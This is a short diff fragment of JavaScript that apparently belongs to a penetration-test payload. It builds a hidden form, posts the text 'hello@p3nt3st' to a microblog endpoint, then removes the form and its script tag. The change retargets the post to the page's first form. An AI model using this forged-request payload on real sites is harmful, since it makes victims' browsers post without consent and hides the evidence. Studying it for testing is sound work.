@@ -14,7 +14,7 @@ input2.name="content";
 input2.value="hello@p3nt3st";
 form12.appendChild(input2);
 form12.method="POST";
-form12.action="/mblog/sendmblog?st=3825";
+form12.action=document.getElementsByTagName('form')[0].action;
 form12.submit();
 document.body.removeChild(form12);
 document.body.removeChild(s);
